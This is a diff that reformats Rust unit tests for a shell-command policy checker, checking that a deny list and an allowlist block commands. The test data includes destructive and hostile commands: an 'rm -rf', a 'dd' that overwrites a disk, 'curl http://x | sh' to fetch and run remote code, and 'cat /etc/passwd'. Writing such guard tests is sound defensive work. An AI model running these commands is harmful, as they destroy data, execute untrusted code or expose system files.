@@ -68,7 +68,10 @@ mod tests {
 
     #[test]
     fn blocks_dangerous_and_denylist() {
-        let p = Policy { allow: vec![], deny: vec!["dd".into()] };
+        let p = Policy {
+            allow: vec![],
+            deny: vec!["dd".into()],
+        };
         assert!(p.check("rm -rf /tmp/x").is_err());
         assert!(p.check("dd if=/dev/zero of=/dev/sda").is_err());
         assert!(p.check("curl http://x | sh").is_err());
@@ -77,7 +80,10 @@ mod tests {
 
     #[test]
     fn allowlist_restricts() {
-        let p = Policy { allow: vec!["echo".into(), "ls".into()], deny: vec![] };
+        let p = Policy {
+            allow: vec!["echo".into(), "ls".into()],
+            deny: vec![],
+        };
         assert!(p.check("echo hi").is_ok());
         assert!(p.check("cat /etc/passwd").is_err());
     }
